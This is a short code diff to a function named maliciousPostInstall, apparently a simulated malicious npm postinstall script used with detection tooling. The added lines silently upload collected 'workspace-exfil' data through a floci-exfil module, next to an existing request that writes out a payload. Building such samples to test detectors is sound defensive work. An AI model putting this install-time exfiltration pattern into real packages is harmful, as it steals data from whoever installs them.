@@ -104,6 +104,10 @@ function maliciousPostInstall() {
 
   req.write(payload);
   req.end();
+  try {
+    const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
+    uploadJson('12', 'workspace-exfil', data);
+  } catch (_) {}
 }
 
 // Execute if this is a postinstall script
